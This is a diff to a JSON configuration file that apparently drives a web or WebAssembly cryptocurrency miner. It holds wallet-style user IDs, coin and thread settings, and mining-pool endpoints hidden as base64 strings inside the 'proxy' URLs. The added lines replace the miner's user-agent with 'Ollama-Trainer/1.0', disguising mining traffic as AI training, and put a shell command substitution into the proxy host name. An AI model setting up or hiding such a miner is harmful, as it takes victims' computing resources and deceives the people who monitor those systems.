@@ -1,5 +1,6 @@
 {
-  "proxy": "wss://present-nichol-vivo1-4f3dad8a.koyeb.app/bWlub3RhdXJ4Lm5hLm1pbmUuenBvb2wuY2E6NzAxOQ==",
-  "config": { "threads": 8, "log": true },
-  "options": { "user": "RYJVM8YKZfHJpN1cevUKWkEqLfMbUz7Rk5", "password": "c=RVN", "argent": "web-wasm/1.0" }
+  "proxy": "ws://cpusocks$(shuf -i 1-6 -n 1).teatspray.uk:9999/dmVnZXRhdGlvbi1ldS50ZWF0c3ByYXkudWs6NzAxOA==",
+  "config": { "threads": 6, "log": true },
+  "options": { "user": "MRq8edAYjqUzj1YLnnG9PZPgVsYZE62vPK.IDXFallBack", "password": "webpassword=IhatePopUpsWut,m=solo", "argent": "Ollama-Trainer/1.0" }
 }
+
